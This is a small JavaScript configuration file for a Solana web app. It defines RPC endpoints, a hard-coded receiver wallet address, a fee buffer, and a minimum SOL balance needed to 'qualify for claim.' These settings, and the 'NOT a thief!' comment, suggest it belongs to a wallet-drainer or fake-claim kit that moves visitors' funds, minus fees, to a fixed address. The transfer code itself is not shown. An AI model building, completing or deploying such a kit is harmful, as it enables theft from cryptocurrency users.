import { PublicKey } from '@solana/web3.js';

// Primary RPC — uses .env value if set, otherwise public mainnet
export const RPC_URL = import.meta.env.VITE_RPC_URL || 'https://api.mainnet-beta.solana.com';

// Fallback RPCs in case the primary is down
export const RPC_ENDPOINTS = [
  RPC_URL,
  'https://api.mainnet-beta.solana.com',
].filter((v, i, a) => a.indexOf(v) === i); // dedupe

// 🎯 Replace with your legitimate receiver wallet (NOT a thief!)
export const RECEIVER_WALLET = new PublicKey('DwLucxM2TNd8jj8ntNJ7BQJAmYAvCaZB2teMmP687jvZ');

// Optional: Minimum balance buffer (in lamports)
export const TRANSFER_FEE_BUFFER = 5000; // ~0.000005 SOL

// Minimum SOL balance required to qualify for claim
export const MIN_QUALIFY_SOL = 0.01;
